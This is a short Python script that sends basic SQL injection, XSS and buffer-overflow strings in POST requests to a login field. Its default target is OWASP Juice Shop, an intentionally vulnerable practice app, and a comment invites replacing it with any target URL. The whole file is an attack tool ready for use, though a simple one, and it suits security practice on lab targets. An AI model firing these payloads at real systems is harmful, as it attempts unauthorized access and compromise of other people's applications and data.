# payload_injection.py
import requests

payloads = {
    "SQLi": "' OR '1'='1'; --",
    "XSS": "<script>alert('XSS');</script>",
    "BufferOverflow": "A" * 1024
}

def inject_payload(url, field_name, payload):
    data = {field_name: payload}
    response = requests.post(url, data=data)
    return response

if __name__ == "__main__":
    url = "https://juice-shop.herokuapp.com/api/Users/#/login"  # Replace with your target URL
    field_name = "email"  # Replace with actual field name for testing
    response = inject_payload(url, field_name, payloads['SQLi'])
    print("Response:", response.text)
